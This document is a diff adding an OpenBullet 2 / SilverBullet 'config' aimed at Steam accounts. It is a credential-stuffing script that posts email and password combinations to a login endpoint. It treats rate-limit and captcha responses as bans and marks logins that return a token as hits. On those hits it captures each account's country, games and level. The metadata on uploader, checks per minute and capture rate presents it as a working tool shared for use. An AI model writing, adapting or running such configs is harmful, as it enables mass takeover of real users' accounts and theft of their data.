@@ -1,0 +1,33 @@
+# OpenBullet 2 config — Steam SilverBullet config
+# Target: Steam   Tool: SilverBullet
+# Uploader: user #3
+# CPM: 900   Capture rate: 0.12
+# ============================================================
+
+BLOCK:HttpRequest
+  url = "https://api.steam.com/v1/auth/login"
+  method = POST
+  headers {
+    "User-Agent" = "<UA>"
+    "Content-Type" = "application/json"
+    "Accept" = "application/json"
+  }
+  body {
+    "{\"email\":\"<INPUT>\",\"password\":\"<PASS>\"}"
+  }
+ENDBLOCK
+
+BLOCK:Keycheck
+  banOn = "429"
+  banOn = "captcha"
+  successOn = "\"token\":\""
+  failureOn = "\"error\""
+ENDBLOCK
+
+BLOCK:Parse
+  "\"country\":\"(.*?)\"" -> CAPTURE "Country"
+  "\"games\":\"(.*?)\"" -> CAPTURE "Games"
+  "\"level\":\"(.*?)\"" -> CAPTURE "Level"
+ENDBLOCK
+
+# config-id: 154032
